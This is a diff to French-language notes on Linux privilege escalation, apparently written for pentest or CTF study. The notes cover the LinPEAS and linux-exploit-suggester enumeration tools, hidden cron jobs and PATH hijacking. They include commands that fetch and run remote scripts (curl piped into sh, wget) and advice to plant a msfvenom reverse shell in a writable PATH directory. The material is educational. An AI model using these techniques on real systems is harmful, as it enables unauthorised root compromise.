@@ -16,7 +16,7 @@ Programme d'énumération :
 
 - Pour chopper le plus d'information possible, on va se servir de programme qui vont automatiser l'énumération :
     - LinEnum
-    - Linpeas (cheaté), on peut l'utiliser en faisant curl -L [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh") | sh ou sinon tu l'envoie en partage de fichier via ta machine. Pense aussi à faire chmod 755 ./linpeas.sh
+    - Linpeas, on peut l'utiliser en faisant curl -L [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh") | sh ou sinon tu l'envoie en partage de fichier via ta machine. Pense aussi à faire chmod 755 ./linpeas.sh
     - linux-exploit-suggester, on peut l'utiliser en faisant wget [https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh") -O les.sh apres tu fais chmod 755 ./les.sh et enfin ./les.sh
 
 # Jobs/Tasks
@@ -33,10 +33,10 @@ Programme d'énumération :
 - Tous ça c'est les tasks système, on veut maintenant les tasks faite par les users (les cachées) :
     - `ls -l /var/spool/cron/crontabs` // normalement t'as pas les perm (que tu peux check en faisant `ls -l /var/spool/cron | grep "crontabs"`)
 - Normalement y'a le sticky bit activé donc il faut trouver autre chose. Par exemple avec linpeas, on peut voir plus d'info sur ça.
-    - Tu pourrais voir en dessous de SHELL=/bin/sh et des 4 lignes des tasks cachées. Si y'a des repo en jaune et rouge, ça veut dire que t'as les perm d'écriture dedans.
+    - Tu pourrais voir en dessous de `SHELL=/bin/sh` et des 4 lignes des tasks cachées. Si y'a des repo en jaune et rouge, ça veut dire que t'as les perm d'écriture dedans.
     - A savoir que si y'a jaune+rouge, t'as 95%  de chance de pouvoir l'exploit pour la privesc.
     - Le plus important à voir c'est la variable PATH car elle définie où chercher quand on execute un program/fichier binaire.
-    - Par exemple, si on a la variable PATH:/dev/shm:/usr/local/sbin:/usr/local/bin et qu'on a une cron tasks qui fait `systemctl list-units --type blabla`, bah pour chercher le fichier binaire systemctl, la machine cherchera d'abord dans /dev/shm puis dans /usr/local/sbin etc...(attention c'est seulement si c'est systemctl, parce que si on a le chemin absolu, il ne va pas chercher dans le path mais directement dans le chemin) Donc si on a dans le PATH un dossier où on peut écrire et créer des fichiers, on a gagné d'avance.
+    - Par exemple, si on a la variable `PATH:/dev/shm:/usr/local/sbin:/usr/local/bin` et qu'on a une cron tasks qui fait `systemctl list-units --type blabla`, bah pour chercher le fichier binaire systemctl, la machine cherchera d'abord dans `/dev/shm` puis dans `/usr/local/sbin` etc...(attention c'est seulement si c'est systemctl, parce que si on a le chemin absolu, il ne va pas chercher dans le path mais directement dans le chemin) Donc si on a dans le PATH un dossier où on peut écrire et créer des fichiers, on a gagné d'avance.
     - Pour voir où se trouve le fichier binaire systemctl, on fait `find / -iname systemctl 2>/dev/null` avec -iname pour ne pas être sensible à la casse.
     - On peut donc voir si on peut écrire dans un dossier qui se trouve avant le dossier qui contient systemctl dans le PATH.
     - Si t'en a un, tu peux donc créer sur ta machine attaquante un reverse shell ou ce que tu veux avec msfvenom puis tu la télécharge sur la cible + `chmod 755 ./filename`
